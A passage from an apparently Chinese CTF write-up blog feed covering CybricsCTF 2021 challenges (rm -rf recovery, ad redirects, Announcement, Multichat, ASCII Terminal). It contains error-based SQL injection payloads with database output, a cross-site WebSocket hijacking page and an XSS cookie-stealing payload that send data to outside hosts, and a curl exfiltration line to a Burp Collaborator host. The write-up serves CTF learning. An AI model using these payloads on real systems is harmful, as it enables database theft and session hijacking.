&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">Response&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Hello World!&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>构造请求的话还是老朋友~~ burp collaborator~~&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl &lt;span style="color:#d88200">&amp;#34;xxxxxx.burpcollaborator.net/`readflag`&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>参考：&lt;a href="http://www.snowywar.top/wp-content/uploads/2021/08/%E9%AD%94%E6%B3%95%E5%B0%91%E5%A5%B3%E5%A4%A9%E5%9B%A2WriteUP.pdf">wp&lt;/a>&lt;/p>
&lt;h2 id="easyjava">easyjava&lt;/h2>
&lt;p>java 根本不会&lt;/p>
&lt;p>放个参考链接 溜了：&lt;a href="https://blog.csdn.net/solitudi/article/details/119322658?spm=1001.2014.3001.5501">wp1&lt;/a> &lt;a href="https://ha1c9on.top/2021/08/02/dasctf-2021-07/">wp2&lt;/a>&lt;/p>
&lt;hr>
&lt;p>最近在总结反序列化有关的东西，想把php, python, java的反序列化 做过的东西总结总结，但还是我想得太简单了 一个php的反序列化就有好多好多东西（装死）&lt;/p>
&lt;p>争取早收工吧，还有upload, xss, csrf, sqli&amp;hellip;&amp;hellip;等着总结 还有超级多东西要学要看&lt;/p>
&lt;p>学习好耶！σ`∀´)&lt;/p></description></item><item><title>CybricsCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/07/29/cybricsctf2021-wp/</link><pubDate>Thu, 29 Jul 2021 17:02:12 +0800</pubDate><guid>https://amiaaaz.github.io/2021/07/29/cybricsctf2021-wp/</guid><description>&lt;h2 id="mic-check-cyber-baby-50-pts">Mic Check (Cyber, Baby, 50 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
&lt;p>Those organizers are changing &lt;a href="https://cybrics.net/rules">game rules&lt;/a> all the time! There’s a flag there, and it’s not that easy to capture.&lt;/p>
&lt;p>&lt;strong>Also be sure to join &lt;a href="https://t.me/cybrics">@cybrics Telegram chat&lt;/a>&lt;/strong> for challenge-related announcements and contacting orgs in case all goes wrong&lt;/p>
&lt;p>&lt;strong>Added at 10:10 —&lt;/strong> looks like the little mic check trolling caused massive pain, I’ve untrolled the rules page :-) You can now copy-paste freely&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724194428638.png" alt="image-20210724194428638">&lt;/p>
&lt;h2 id="scanner-rebyc-baby-50-pts">Scanner (rebyC, Baby, 50 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Mikhail Driagunov (&lt;a href="https://t.me/aethereternity">@aethereternity&lt;/a>)&lt;/p>
&lt;p>Check out this cool new &lt;a href="https://scanner-cybrics2021.ctf.su/">&lt;strong>game&lt;/strong>&lt;/a>!&lt;/p>
&lt;p>I heard they serve flags at level 5.&lt;/p>
&lt;/blockquote>
&lt;p>不难，就是比较鸡贼 把好好的图片弄成犹抱琵琶半遮面&lt;/p>
&lt;p>首先用&lt;a href="https://gifsuper.com/">Gif Super&lt;/a>把帧间隔调为300ms，然后裁剪出中间有用的部分 放入&lt;a href="http://www.atoolbox.net/Tool.php?Id=979">GIF动态图片分解&lt;/a>中看结果 都有在线工具就很方便&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724202614568.png" alt="image-20210724202614568">&lt;/p>
&lt;p>所以这个破玩意到底是啥？猪？还是刺猬？
别的都还算正常吧 就是都不太像其实 有star, goose, flag, flower, ring, house, bone&amp;hellip;. 最后一个是二维码 比较麻烦&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724203314255.png" alt="image-20210724203314255">&lt;/p>
&lt;p>再稍微调整一下尺寸，扫描就行了&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724203713402.png" alt="image-20210724203713402">&lt;/p>
&lt;h2 id="rm--rfer-ctb-baby-166-pts">rm -rf’er (CTB, Baby, 166 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
&lt;p>Alarm! We accidentally did &lt;code>rm -rf /*&lt;/code> on a very important server. Now all that’s left is one shell session.&lt;/p>
&lt;pre tabindex="0">&lt;code>ssh rmrfer@178.154.210.26
Password: sa7Neiyi
&lt;/code>&lt;/pre>&lt;p>Rescue the &lt;strong>flag.txt&lt;/strong> file from one of the directories by only using your shell&lt;/p>
&lt;p>&lt;strong>Added at 13:45 —&lt;/strong> frequent question: yes, if you found &lt;code>flag.txt&lt;/code>, the flag is right there, in the open, as plain text. Just read it. If you’re not seeing the flag, try to find another method that will not hide info from you&lt;/p>
&lt;/blockquote>
&lt;p>这个题 emmmmm
只要ssh一连接就会自动执行&lt;code>rm -rf /*&lt;/code>的指令，当反应过来的时候系统已经删的连ls指令都不剩了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729003620922.png" alt="image-20210729003620922">&lt;/p>
&lt;p>先说非预期解吧：当输入连接密码后立刻ctrl+c 只要够快 就执行不了&lt;code>rm -rf /*&lt;/code>，之后就可以顺畅的穿梭于这个buildbox之间拿flag了&lt;/p>
&lt;p>预期解则是这样的：当系统执行删除命令后 很多外部指令都被删除 需要通过仅剩的一些内置函数完成&amp;quot;read&amp;quot;的功能；从之前的报错信息可知 buildbox使用的是tcsh，在tcsh中&lt;code>echo $&amp;lt;&lt;/code>命令相当于&lt;code>read&lt;/code>函数，读入标准输入并输出；tcsh中加括号的命令都会在子shell中运行；构造payload &lt;code>(echo &amp;quot;$&amp;lt;&amp;quot;) &amp;lt; /etc/ctf/flag.txt&lt;/code>，即 读取flag.txt并输出&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729005544665.png" alt="image-20210729005544665">&lt;/p>
&lt;h2 id="ad-network-web-baby-50-pts">Ad Network (Web, Baby, 50 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Alexander Menshchikov (&lt;a href="https://t.me/n0str">@n0str&lt;/a>)&lt;/p>
&lt;p>We are so tired of advertising on the internet. It feels like it breaks the internet. Try to follow the ad, try to follow its rules.&lt;/p>
&lt;p>&lt;a href="http://adnetwork-cybrics2021.ctf.su/">Adnetwork website&lt;/a>&lt;/p>
&lt;p>There is a flag 1337 redirects deep into the network&amp;hellip;&lt;/p>
&lt;/blockquote>
&lt;p>&lt;del>这个我是不知道怎么做……页面上的任何链接部分都是自己页面内的跳转，提示的是redirect重定向，可是抓包后没有302 也没有一直在做重定向呀 要怎么看呢？&lt;/del>&lt;/p>
&lt;p>emmmm 在比赛第二天再次尝试的时候用burp的自带的chromium的浏览器（之前是知道这个 但是没有用过）欸 页面左上角显示了一个gif图
这个图在昨天做的时候看到， 内容是 &lt;em>awesome ad from adnetwork&lt;/em>，但是edge浏览器在加载这个图的时候会自动阻止 我单独看了内容也没发现什么特别的 就没有注意这里。事后角度看这里 其实一个Gif图被阻止请求应该是很反常的事情，应该首先引起注意的&amp;hellip;&amp;hellip; &lt;del>（都怪edge!!!&lt;/del>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210725133924877.png" alt="image-20210725133924877">&lt;/p>
&lt;p>点击gif会有单独的弹窗出来，提示重定向次数过多；看burp中的抓包记录 确实多的离谱，按照题目中的提示 得有1337层，得上个脚本慢慢跑了 这个比较好弄&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210725134346221.png" alt="image-20210725134346221">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://adnetwork-cybrics2021.ctf.su/adnetwork&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">_&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1337&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">allow_redirects&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">18&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>emmm 比较慢其实 应该有别的的方式？最后的flag是 cybrics{f0lL0w_RUl3Z_F0ll0W_r3d1r3C7z}&lt;/p>
&lt;p>比赛完了看了别的wp 这块可以用session设允许重定向的次数，这样更方便&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Session&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">max_redirects&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1337&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://adnetwork-cybrics2021.ctf.su/adnetwork&amp;#34;&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">allow_redirects&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="announcement-web-easy-60-pts">Announcement (Web, Easy, 60 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Alexander Menshchikov (&lt;a href="https://t.me/n0str">@n0str&lt;/a>)&lt;/p>
&lt;p>Ladies and gentlemen!&lt;/p>
&lt;p>Allow us to introduce a brand new project —
⚐ The Flag&lt;/p>
&lt;p>&lt;a href="http://announcement-cybrics2021.ctf.su/">Announcement website&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>简约漂亮的前端&lt;/p>
&lt;p>有个输入邮箱的框，提交会发送一个post请求：digest=xxxx&amp;amp;email=xxxx
尝试一个1@1.com，重放的时候直接修改email值会提示Invalid digest，发现其中digest的值就是md5(&amp;lsquo;&lt;a href="mailto:1@1.com">1@1.com&lt;/a>&amp;rsquo;) 随email而改变，尝试注入&lt;/p>
&lt;pre tabindex="0">&lt;code>digest=76af11f3eaf7b12e72d7d88e4cf2ee01&amp;amp;email='or'1 // 回显正常 无报错
digest=c3593d255957d60d5d489ae682da8aee&amp;amp;email=1')# // 报错：Something went wrong during database insert: Column count doesn't match value count at row 1
digest=5c07c683d062d17ec799fa177ce88058&amp;amp;email=1',1)# // 报错：Something went wrong during database insert: Incorrect datetime value: '1' for column 'timestamp' at row 1
&lt;/code>&lt;/pre>&lt;p>确定是sqli 并且当前表有两列 email+timestamp，使用的语句应该是这个吧？&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#00a8c8">insert&lt;/span> &lt;span style="color:#00a8c8">into&lt;/span> &lt;span style="color:#00a8c8">table_name&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">email&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">timestamp&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">values&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">email&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">now&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>可利用的部分是可以插入的email，报错注入&lt;/p>
&lt;pre tabindex="0">&lt;code>digest=e1e79bd6fafe38f7073ec1f3ef1513fa&amp;amp;email=1',1 or updatexml(1,concat(0x7e,database()),0))# // Something went wrong during database insert: XPATH syntax error: '~announcement'
digest=c9f14624524736a74164cc6024fdefce&amp;amp;email=' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='announcement')),0) or ' // Something went wrong during database insert: XPATH syntax error: '~emails,logs'
digest=94707222b90505ab0aa5e1fd3916e77d&amp;amp;email=' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='announcement' and table_name='logs')),0) or ' // Something went wrong during database insert: XPATH syntax error: '~log'
digest=66bf6db11d9bee8e897b874a430f5704&amp;amp;email=' or updatexml(1,concat(0x7e,(select group_concat(log) from logs)),0) or ' // Something went wrong during database insert: XPATH syntax error: '~cybrics{1N53r7_0ld_900d_5ql}'
&lt;/code>&lt;/pre>&lt;p>没什么好说的，经典报错注入流程：确定字段数-&amp;gt;爆数据库名(announcement)-&amp;gt;表名(emails, logs)-&amp;gt;字段名(log)-&amp;gt;具体数据 拿flag&lt;/p>
&lt;h2 id="multichat-web-medium-138-pts">Multichat (Web, Medium, 138 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Alexander Menshchikov (&lt;a href="https://t.me/n0str">@n0str&lt;/a>)&lt;/p>
&lt;p>Yet another chat-messenger with rooms support! Free to use. Convince the admin that its code is insecure.&lt;/p>
&lt;p>Tip: Admin and tech support are members of a secret chat room. Tech support can ask admin to tell him the flag, to do that tech support writes him a message (in a chat): &amp;ldquo;&lt;code>Hey, i forgot the flag. Can you remind me?&lt;/code>&amp;rdquo;. Then admin will tell him the flag.&lt;/p>
&lt;p>&lt;a href="http://multichat-cybrics2021.ctf.su/">Multichat website&lt;/a>&lt;/p>
&lt;p>Team token for the support call: &lt;code>p32vhJKrnx_hajUc8nLTFw&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>聊天室，admin和tech support在一个秘密的聊天室内（10位数字的房间号），tech support可以让admin给出flag（后面那个team token for the support call是要用到吗还是怎么样&lt;/p>
&lt;p>抓包，看到了&lt;code>Connection: Upgrade&lt;/code> &lt;code>Upgrade: websocket&lt;/code>，这个聊天室是建立了一个websocket连接&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724225447805.png" alt="image-20210724225447805">（websocket这块知识印象中之前接触过一次 也就一次 相关链接还是放后面&lt;/p>
&lt;p>链接里的一个csrf攻击的实例跟这个有点像了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724232946228.png" alt="image-20210724232946228">&lt;/p>
&lt;p>但是这里的又不太一样，websocket最初建立时的http部分 cookie中有chatroom的id，这个值是未知的（&lt;em>Admin and tech support are members of a secret chat room.&lt;/em>）；另外tech support是先会发*‘Hey, i forgot the flag. Can you remind me?’*，需要的是触发（如果它不会自己发这一条内容的话）和监听它的信息 然后捕捉到它的下一条admin发送的内容，拿到flag&lt;/p>
&lt;p>（比赛的时候就想到这里，具体的实现不知道该怎么弄了，以下是看了wp之后的复现）&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728001013129.png" alt="image-20210728001013129">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728001122843.png" alt="image-20210728001122843">&lt;/p>
&lt;p>5000端口处有Support页面，tech support在这里可以访问任意的页面并建立websocket发送消息，不限制跨域 所以可以将自己的网站写到这里，support会带着它的cookie（和admin在一个房间里 cookie是房间id）过来访问，然后借助js的脚本拿到它的cookie；以下是&lt;a href="https://mp.weixin.qq.com/s/SQ-DGvug-P6PK-s3qkJVdw">来自w&amp;amp;m的脚本&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">head&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">head&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;text/javascript&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">WebSocket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ws://multichat-cybrics2021.ctf.su/ws&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onclose&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">item&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">code&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#ae81ff">1003&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">item&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`Status: &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">reason&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">item&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Connection closed.&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">fetch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://api.chara.pub:1337/aaa.txt?&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">encodeURIComponent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">item&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onopen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">fetch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://api.chara.pub:1337/aaa.txt?&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">encodeURIComponent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;connected&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onmessage&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">fetch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://api.chara.pub:1337/aaa.txt?&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">encodeURIComponent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hey, i forgot the flag. Can you remind me?&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">setTimeout&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2000&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者非预期解：在url部分进行xss，payload: &lt;code>javascript:location.href='http://vps/?cookie='+document.cookie&lt;/code>（此处用的是burp collaborator）直接可以获取房间号，连入房间后发消息即可拿到flag&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729144122926.png" alt="image-20210729144122926">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729143946243.png" alt="image-20210729143946243">&lt;/p>
&lt;p>参考：&lt;a href="https://www.runoob.com/html/html5-websocket.html">HTML5 WebSocket&lt;/a> | &lt;a href="https://wiki.wgpsec.org/knowledge/web/websocket-sec.html">WebSocket安全问题分析&lt;/a> &lt;a href="https://segmentfault.com/a/1190000014582485">WebSocket断开原因分析&lt;/a> | &lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Request/mode">Request.mode&lt;/a> &lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API/Using_Fetch">使用 Fetch&lt;/a> | &lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/API/WindowOrWorkerGlobalScope/fetch">WorkerOrGlobalScope.fetch()&lt;/a> | &lt;a href="https://www.freebuf.com/news/193447.html">Burpsuite Collaborator模块详解&lt;/a> | &lt;a href="https://blog.fabiopires.pt/running-your-instance-of-burp-collaborator-server/">Running Your Instance of Burp Collaborator Server&lt;/a>（列入待完成计划&lt;/p>
&lt;h2 id="ascii-terminal-network-baby-116-pts">ASCII Terminal (Network, Baby, 116 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Artur Khanov (&lt;a href="https://t.me/awengar">@awengar&lt;/a>)&lt;/p>
&lt;p>At &lt;code>138.68.83.253:3333&lt;/code> you have an ASCII terminal. It really works, check with the &lt;a href="https://cybrics.net/files/id.txt">&lt;strong>id command&lt;/strong>&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>nc连上以后可以看到一个bash $，题目的提示是&amp;quot;ASCII termial&amp;quot;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728231402633.png" alt="image-20210728231402633">&lt;/p>
&lt;p>把要执行的命令也表示成这种形式后发送即可，这里使用的是linux下的toilet工具&lt;/p>
&lt;p>toilet可以把字母拼成用字符或其他方式表示的更大的字母，可以带一些参数来控制字体 字号以及样式 比如&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728234413850.png" alt="image-20210728234413850">&lt;/p>
&lt;p>可以玩出很多花样~&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728234351668.png" alt="image-20210728234351668">&lt;/p>
&lt;p>书归正题，这里使用&lt;code>toilet -f bigascii9 +command&lt;/code>的命令生成结果，将空格换为 &lt;code>.&lt;/code>再发送即可&lt;/p>
&lt;pre tabindex="0">&lt;code>toilet -f bigascii9 ls &amp;gt; ls.txt
cat ls.txt | nc 138.68.83.253 3333 &amp;gt; ls_result.txt
toilet -f bigascii9 'cat flag.txt' &amp;gt; cat.txt
cat cat.txt | nc 138.68.83.253 2333 &amp;gt; flag.txt
